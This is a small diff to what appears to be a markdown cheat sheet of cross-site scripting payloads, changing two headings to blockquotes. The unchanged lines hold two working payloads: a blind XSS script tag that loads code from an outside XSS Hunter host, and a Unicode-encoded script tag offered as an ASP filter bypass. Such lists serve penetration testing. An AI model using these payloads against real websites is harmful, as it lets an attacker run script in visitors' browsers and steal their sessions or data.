@@ -1,8 +1,8 @@
-Blind XSS payload XXShunter
+> Blind XSS payload XXShunter
 
 ```"><script src=https://a007.xss.ht></script>```
 
-ASP filter bypass
+> ASP filter bypass
 
 ```%u003Cscript%u003Eprompt%u0028303%u0029%u003C/script%u003E```
 
